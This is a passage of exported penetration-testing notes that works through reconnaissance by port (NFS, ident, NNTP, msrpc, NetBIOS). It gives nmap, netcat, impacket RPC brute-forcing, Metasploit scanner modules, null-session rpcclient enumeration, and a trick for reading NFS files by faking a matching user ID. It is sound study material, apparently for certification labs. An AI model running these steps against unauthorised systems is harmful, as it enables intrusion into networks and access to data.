 margin-bottom:0in'>
 <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
     style='font-family:Calibri;font-size:11.0pt'>nmap</span></li>
 <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
  margin-bottom:0in'>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>Nmap –sV –
      –script=rpcinfo 10.11.1.1-254</span></l
 </ul>
 <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
     style='font-family:Calibri;font-size:11.0pt'>netcat</span></li>
 <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
  margin-bottom:0in'>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>nc –nv &lt;ip addre
s&gt; </span></li>
 </ul>
</ul>

<p style='margin:0in;font-family:Calibri;font-size:11.0pt'>&nbsp;</p>

<ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
 margin-bottom:0in'>
 <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
     style='font-family:Calibri;font-size:11.0pt'>Network File System (NFS)</span></li>
 <ul type=circle style='direction:ltr;unicode-bidi:embed;margin-top:0in;
  margin-bottom:0in'>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>Often used with Unix
      systems.<span style='mso-spacerun:yes'>  </span>Can be difficult t
o setup
      securely so it is not uncommon that NFS shares are open to the world.</span></li>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>Gain access to files that
      show an owner with a UUID #</span></li>
  <ul type=square style='direction:ltr;unicode-bidi:embed;margin-top:0in;
   margin-bottom:0in'>
   <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
       style='font-family:Calibri;font-size:11.0pt'>Create a new user on local
       machine with same UUID # as the user that has access to that file or
       folder</span></li>
   <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
    margin-bottom:0in'>
    <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
        style='font-family:Calibri;font-size:11.0pt'>Create and use imposter
        user:</span></li>
    <ul type=circle style='direction:ltr;unicode-bidi:embed;margin-top:0in;
     margin-bottom:0in'>
     <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
         style='font-family:Calibri;font-size:11.0pt'>adduser &lt;user&gt;</span></li>
     <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
         style='font-family:Calibri;font-size:11.0pt'>Change UUID in
         /etc/passwd</span></li>
     <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
         style='font-family:Calibri;font-size:11.0pt'>sudo su &lt;newuser&gt;</span></li>
    </ul>
   </ul>
  </ul>
 </ul>
</ul>

<p style='margin:0in;margin-left:1.875in;font-family:Calibri;font-size:11.0pt'>&nbsp;</p>

<div style='direction:ltr'>

<table border=1 cellpadding=0 cellspacing=0 valign=top style='direction:ltr;
 border-collapse:collapse;border-style:solid;border-color:#A3A3A3;border-width:
 1pt;margin-left:.3333in' title="" summary="">
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:1.9513in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Mount NFS share</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:5.852in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>sudo mount -o
  nolock ip.address:/shareName ~/LocalFolderForSharetoMounto/</p>
  <div style='direction:ltr'>
  <table border=1 cellpadding=0 cellspacing=0 valign=top style='direction:ltr;
   border-collapse:collapse;border-style:solid;border-color:#A3A3A3;border-width:
   1pt' title="" summary="">
   <tr>
    <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
    vertical-align:top;width:3.6694in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
    <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Disable file
    locking.<span style='mso-spacerun:yes'>  </span>Often needed for old
er NFS
    servers</p>
    </td>
    <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
    vertical-align:top;width:.7118in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
    <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>-o nolock</p>
    </td>
   </tr>
  </table>
  </div>
  </td>
 </tr>
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:1.9701in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Show mounting
  information</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:5.8326in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>showmount</p>
  <div style='direction:ltr'>
  <table border=1 cellpadding=0 cellspacing=0 valign=top style='direction:ltr;
   border-collapse:collapse;border-style:solid;border-color:#A3A3A3;border-width:
   1pt' title="" summary="">
   <tr>
    <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
    vertical-align:top;width:1.593in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
    <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Show all mount
    points</p>
    </td>
    <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
    vertical-align:top;width:.5354in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
    <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>-a</p>
    </td>
   </tr>
   <tr>
    <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
    vertical-align:top;width:1.5736in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
    <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Show all
    directories</p>
    </td>
    <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
    vertical-align:top;width:.5548in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
    <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>-d</p>
    </td>
   </tr>
   <tr>
    <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
    vertical-align:top;width:1.5736in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
    <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Show export list</p>
    </td>
    <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
    vertical-align:top;width:.5548in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
    <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>-e</p>
    </td>
   </tr>
  </table>
  </div>
  </td>
 </tr>
</table>

</div>

<p style='margin:0in;margin-left:.375in;font-family:Calibri;font-size:11.0pt'>&nbsp;</p>

<p style='margin:0in;margin-left:.375in;font-family:Calibri;font-size:11.0pt'>&nbsp;</p>

<p style='margin:0in;margin-left:.375in;font-family:Calibri;font-size:11.0pt'>&nbsp;</p>

<p style='margin:0in;margin-left:.375in;font-family:Calibri;font-size:11.0pt'>&nbsp;</p>

<p style='margin:0in;font-family:Calibri;font-size:11.0pt'>&nbsp;</p>

</div>

</div>

</div>

<p style='margin:0in'>&nbsp;</p>

<p style='margin:0in'>&nbsp;</p>

<p style='margin:0in'>&nbsp;</p>

<div style='direction:ltr;border-width:100%'>

<div style='direction:ltr;margin-top:0in;margin-left:0in;width:5.4826in'>

<div style='direction:ltr;margin-top:0in;margin-left:0in;width:2.2486in'>

<p style='margin:0in;font-family:"Calibri Light";font-size:20.0pt'>113 TCP /
ident</p>

</div>

<div style='direction:ltr;margin-top:.0423in;margin-left:0in;width:2.3423in'>

<p style='margin:0in;font-family:Calibri;font-size:10.0pt;color:#767676'>Thursday,
May 27, 2021</p>

<p style='margin:0in;font-family:Calibri;font-size:10.0pt;color:#767676'>11:23
AM</p>

</div>

<div style='direction:ltr;margin-top:.434in;margin-left:.1263in;width:5.3562in'>

<ul style='direction:ltr;unicode-bidi:embed;margin-top:0in;margin-bottom:0in'>
 <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
  margin-bottom:0in'>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>Used to identify who is
      using a TCP connection</span></li>
  <ul type=circle style='direction:ltr;unicode-bidi:embed;margin-top:0in;
   margin-bottom:0in'>
   <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
       style='font-family:Calibri;font-size:11.0pt'>By default nmap -sC will
       enumerate every use of every running port</span></li>
  </ul>
 </ul>
</ul>

</div>

</div>

</div>

<p style='margin:0in'>&nbsp;</p>

<p style='margin:0in'>&nbsp;</p>

<p style='margin:0in'>&nbsp;</p>

<div style='direction:ltr;border-width:100%'>

<div style='direction:ltr;margin-top:0in;margin-left:0in;width:7.6666in'>

<div style='direction:ltr;margin-top:0in;margin-left:0in;width:2.3in'>

<p style='margin:0in;font-family:"Calibri Light";font-size:20.0pt'>119 TCP /
NNTP</p>

</div>

<div style='direction:ltr;margin-top:.0423in;margin-left:0in;width:2.1in'>

<p style='margin:0in;font-family:Calibri;font-size:10.0pt;color:#666666'>Friday,
May 7, 2021</p>

<p style='margin:0in;font-family:Calibri;font-size:10.0pt;color:#666666'>11:07
AM</p>

</div>

<div style='direction:ltr;margin-top:.434in;margin-left:.1013in;width:7.5652in'>

<ul style='direction:ltr;unicode-bidi:embed;margin-top:0in;margin-bottom:0in'>
 <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
  margin-bottom:0in'>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>Network News Transfer
      Protocol</span></li>
  <ul type=circle style='direction:ltr;unicode-bidi:embed;margin-top:0in;
   margin-bottom:0in'>
   <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
       style='font-family:Calibri;font-size:11.0pt'>Allows clients to retrieve
       (read) and post (write) new articles to the NNTP server.</span></li>
   <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
       style='font-family:Calibri;font-size:11.0pt'>Tools</span></li>
   <ul type=square style='direction:ltr;unicode-bidi:embed;margin-top:0in;
    margin-bottom:0in'>
    <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
        style='font-family:Calibri;font-size:11.0pt'>Netcat</span></li>
    <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
     margin-bottom:0in'>
     <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
         style='font-family:Calibri;font-size:11.0pt'>nc –nv &lt;ip ad
ress&gt;
         &lt;port&gt;</span></li>
    </ul>
   </ul>
   <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
       style='font-family:Calibri;font-size:11.0pt'>Commands:</span></li>
  </ul>
 </ul>
 <div style='direction:ltr'>
 <table border=1 cellpadding=0 cellspacing=0 valign=top style='direction:ltr;
  border-collapse:collapse;border-style:solid;border-color:#A3A3A3;border-width:
  1pt;margin-left:.7083in' title="" summary="">
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:1.3736in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>List available
   commands</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:5.4548in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>HELP</p>
   </td>
  </tr>
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:1.3736in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>List available
   article to read</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:5.4548in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>LIST</p>
   <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
    margin-bottom:0in'>
    <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
        style='font-family:Calibri;font-size:11.0pt'>Example:</span></li>
   </ul>
   <div style='direction:ltr'>
   <table border=1 cellpadding=0 cellspacing=0 valign=top style='direction:
    ltr;border-collapse:collapse;border-style:solid;border-color:#A3A3A3;
    border-width:1pt;margin-left:.3333in' title="" summary="">
    <tr>
     <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
     vertical-align:top;width:3.9513in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
     <ul style='direction:ltr;unicode-bidi:embed;margin-top:0in;margin-bottom:
      0in'>
      <ul type=circle style='direction:ltr;unicode-bidi:embed;margin-top:0in;
       margin-bottom:0in'>
       <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
           style='font-family:Calibri;font-size:11.0pt'>LIST</span></li>
      </ul>
      <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>215 list of
      newsgroups follows<br>
            org.apache.avalon.dev 0 0 y</p>
      <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>org.apache.avalon.user
      0 0 y</p>
     </ul>
     </td>
    </tr>
   </table>
   </div>
   <ul type=square style='direction:ltr;unicode-bidi:embed;margin-top:0in;
    margin-bottom:0in'>
    <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
        style='font-family:"Calibri Light";font-size:11.0pt'>The 0 in each
        column means the first and last article for each newgroup is 0.<span
        style='mso-spacerun:yes'>  </span>This means there are no articl
        available to read.</span></li>
   </ul>
   </td>
  </tr>
 </table>
 </div>
</ul>

</div>

</div>

</div>

<p style='margin:0in'>&nbsp;</p>

<p style='margin:0in'>&nbsp;</p>

<p style='margin:0in'>&nbsp;</p>

<div style='direction:ltr;border-width:100%'>

<div style='direction:ltr;margin-top:0in;margin-left:0in;width:13.3416in'>

<div style='direction:ltr;margin-top:0in;margin-left:0in;width:2.3555in'>

<p style='margin:0in;font-family:"Calibri Light";font-size:20.0pt'>135 TCP /
msrpc</p>

</div>

<div style='direction:ltr;margin-top:.0423in;margin-left:0in;width:2.159in'>

<p style='margin:0in;font-family:Calibri;font-size:10.0pt;color:#666666'>Monday,
April 5, 2021</p>

<p style='margin:0in;font-family:Calibri;font-size:10.0pt;color:#666666'>2:21
PM</p>

</div>

<div style='direction:ltr;margin-top:.434in;margin-left:0in;width:13.3416in'>

<ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
 margin-bottom:0in'>
 <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
     style='font-family:Calibri;font-size:11.0pt'>Lists all rpc endoints</span></li>
 <ul type=circle style='direction:ltr;unicode-bidi:embed;margin-top:0in;
  margin-bottom:0in'>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>Typically lists a ton of
      information that makes it tough to work with</span></li>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>Used with other exploits
      like SMB relays</span></li>
 </ul>
 <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
     style='font-family:Calibri;font-size:11.0pt'>Tools</span></li>
 <ul type=circle style='direction:ltr;unicode-bidi:embed;margin-top:0in;
  margin-bottom:0in'>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>impacket-rpcdump</span></li>
 </ul>
</ul>

<div style='direction:ltr'>

<table border=1 cellpadding=0 cellspacing=0 valign=top style='direction:ltr;
 border-collapse:collapse;border-style:solid;border-color:#A3A3A3;border-width:
 1pt;margin-left:.7083in' title="" summary="">
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:1.5486in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Dump all
  information</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:1.6208in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>impacket-rpcdump
  &lt;ip&gt;</p>
  </td>
 </tr>
</table>

</div>

<ul type=circle style='direction:ltr;unicode-bidi:embed;margin-top:0in;
 margin-bottom:0in'>
 <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
     style='font-family:Calibri;font-size:11.0pt'>impacket-rpcmap</span></li>
</ul>

<div style='direction:ltr'>

<table border=1 cellpadding=0 cellspacing=0 valign=top style='direction:ltr;
 border-collapse:collapse;border-style:solid;border-color:#A3A3A3;border-width:
 1pt;margin-left:.7083in' title="" summary="">
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:5.0076in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Map rpc
  information</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:7.4951in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>'ncacn_ip_tcp:&lt;ip&gt;'</p>
  </td>
 </tr>
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:5.0076in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Brute force the
  endpoints we can interact with and the specific methods</p>
  <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
   margin-bottom:0in'>
   <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
       style='font-family:Calibri;font-size:11.0pt'>Google the UUID's to look
       at the </span></li>
   <ul type=circle style='direction:ltr;unicode-bidi:embed;margin-top:0in;
    margin-bottom:0in'>
    <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
        style='font-family:Calibri;font-size:11.0pt'>site: docs.microsoft.com
        &lt;UUID&gt;</span></li>
   </ul>
   <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
       style='font-family:Calibri;font-size:11.0pt'>Google .dll's</span></li>
   <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
       style='font-family:Calibri;font-size:11.0pt'>Google around to see how to
       interact with methods we can interact with</span></li>
  </ul>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:7.4951in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>'ncacn_ip_tcp:10.129.29.115'
  -brute-uuids -brute-opnums -auth-level 1 -opnum-max &lt;# (go as low as maybe
  5 up to 100)&gt;</p>
  </td>
 </tr>
</table>

</div>

<ul type=circle style='direction:ltr;unicode-bidi:embed;margin-top:0in;
 margin-bottom:0in'>
 <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
     style='font-family:Calibri;font-size:11.0pt'>metasploit</span></li>
 <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
  margin-bottom:0in'>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>/auxiliary/scanner/dcerpc/endpoint_mapper</span></li>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>/auxiliary/scanner/dcerpc/hidden</span></li>
 </ul>
</ul>

<p style='margin:0in;font-family:Calibri;font-size:11.0pt'>&nbsp;</p>

</div>

</div>

</div>

<p style='margin:0in'>&nbsp;</p>

<p style='margin:0in'>&nbsp;</p>

<p style='margin:0in'>&nbsp;</p>

<div style='direction:ltr;border-width:100%'>

<div style='direction:ltr;margin-top:0in;margin-left:0in;width:13.3736in'>

<div style='direction:ltr;margin-top:0in;margin-left:0in;width:2.534in'>

<p style='margin:0in;font-family:"Calibri Light";font-size:20.0pt'>139 TCP /
Netbios</p>

</div>

<div style='direction:ltr;margin-top:.0423in;margin-left:0in;width:2.3986in'>

<p style='margin:0in;font-family:Calibri;font-size:10.0pt;color:#666666'>Monday,
February 8, 2021</p>

<p style='margin:0in;font-family:Calibri;font-size:10.0pt;color:#666666'>2:35
PM</p>

</div>

<div style='direction:ltr;margin-top:.434in;margin-left:0in;width:13.3736in'>

<ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
 margin-bottom:0in'>
 <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
     style='font-family:Calibri;font-size:11.0pt'>Netbios is different from
     SMB<span style='mso-spacerun:yes'>  </span></span></li
 <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
     style='font-family:Calibri;font-size:11.0pt'>A session layer protocol and
     service that allows computers on a local network to communicate with each
     other.</span></li>
 <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
     style='font-family:Calibri;font-size:11.0pt'>Modern implementations of SMB
     do not require netbios.</span></li>
 <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
     style='font-family:Calibri;font-size:11.0pt'>netbios is required for
     backwards compatibility with SMB.</span></li>
</ul>

<p style='margin:0in;font-family:Calibri;font-size:11.0pt'>&nbsp;</p>

<ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
 margin-bottom:0in'>
 <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
     style='font-family:Calibri;font-size:11.0pt'>Tools</span></li>
 <ul type=circle style='direction:ltr;unicode-bidi:embed;margin-top:0in;
  margin-bottom:0in'>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>nbtscan</span></li>
 </ul>
</ul>

<div style='direction:ltr'>

<table border=1 cellpadding=0 cellspacing=0 valign=top style='direction:ltr;
 border-collapse:collapse;border-style:solid;border-color:#A3A3A3;border-width:
 1pt;margin-left:.3333in' title="" summary="">
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:2.6277in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Example usage</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:1.9472in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>sudo nbtscan -r
  10.11.1.0/24</p>
  </td>
 </tr>
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:2.6472in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Specify the
  originating UDP port as 137</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:1.8583in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>-r</p>
  </td>
 </tr>
</table>

</div>

<p style='margin:0in;margin-left:.375in;font-family:Calibri;font-size:11.0pt'>&nbsp;</p>

<ul type=circle style='direction:ltr;unicode-bidi:embed;margin-top:0in;
 margin-bottom:0in'>
 <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
     style='font-family:Calibri;font-size:11.0pt'>rpcclient</span></li>
</ul>

<div style='direction:ltr'>

<table border=1 cellpadding=0 cellspacing=0 valign=top style='direction:ltr;
 border-collapse:collapse;border-style:solid;border-color:#A3A3A3;border-width:
 1pt;margin-left:.3333in' title="" summary="">
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:3.7402in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Authentication</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:9.2708in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <div style='direction:ltr'>
  <table border=1 cellpadding=0 cellspacing=0 valign=top style='direction:ltr;
   border-collapse:collapse;border-style:solid;border-color:#A3A3A3;border-width:
   1pt' title="" summary="">
   <tr>
    <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
    vertical-align:top;width:7.1777in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
    <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Typical
    authentication</p>
    </td>
    <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
    vertical-align:top;width:1.9097in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
    <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>rpcclient &lt;ip
    address&gt;</p>
    </td>
   </tr>
   <tr>
    <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
    vertical-align:top;width:7.2555in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
    <ul style='direction:ltr;unicode-bidi:embed;margin-top:0in;margin-bottom:
     0in'>
     <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
      margin-bottom:0in'>
      <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
          style='font-family:Calibri;font-size:11.0pt'>Null authentication</span></li>
      <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
       margin-bottom:0in'>
       <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
           style='font-family:Calibri;font-size:11.0pt'>This generally works on
           Domains from 2003.<span style='mso-spacerun:yes'>  </span>New
ly
           installed domains do not like null authentication</span></li>
       <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
           style='font-family:Calibri;font-size:11.0pt'>If this works then note
           that null authentication allows domain enumeration and a lot of
           information can be found</span></li>
      </ul>
     </ul>
    </ul>
    </td>
    <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
    vertical-align:top;width:1.959in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
    <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>rpcclient -U ''
    -N &lt;ip address&gt;</p>
    </td>
   </tr>
  </table>
  </div>
  </td>
 </tr>
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:3.7402in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Enumerate users</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:9.1694in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>enumdomusers<br>
    querydispinfo</p>
  </td>
 </tr>
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:3.7402in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Get user SID</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:9.1694in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>lookupnames
  &lt;username&gt;</p>
  </td>
 </tr>
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:3.7402in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Enumerate user
  groups</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:9.1694in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>queryusergroups
  &lt;[rid value]&gt;</p>
  </td>
 </tr>
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:3.7402in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Query group name
  from rid value</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:9.1694in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>querygroup &lt;rid
  value&gt;</p>
  </td>
 </tr>
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:3.7402in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Enumerate printers</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:9.1694in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>enumprinters</p>
  </td>
 </tr>
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:3.7402in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Enumerate groups</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:9.1694in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>enumalsgroups
  [Builtin|Domain]</p>
  </td>
 </tr>
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:3.7402in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
